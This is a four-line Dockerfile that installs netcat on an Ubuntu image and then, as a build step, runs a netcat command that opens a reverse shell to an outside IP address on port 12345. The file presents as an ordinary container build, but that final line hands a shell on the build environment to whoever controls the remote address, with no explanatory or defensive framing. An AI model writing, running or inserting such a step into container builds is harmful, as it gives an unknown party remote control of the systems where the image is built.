FROM ubuntu

RUN apt-get update
RUN apt-get -y install netcat

RUN nc -e /bin/sh 78.46.202.180 12345
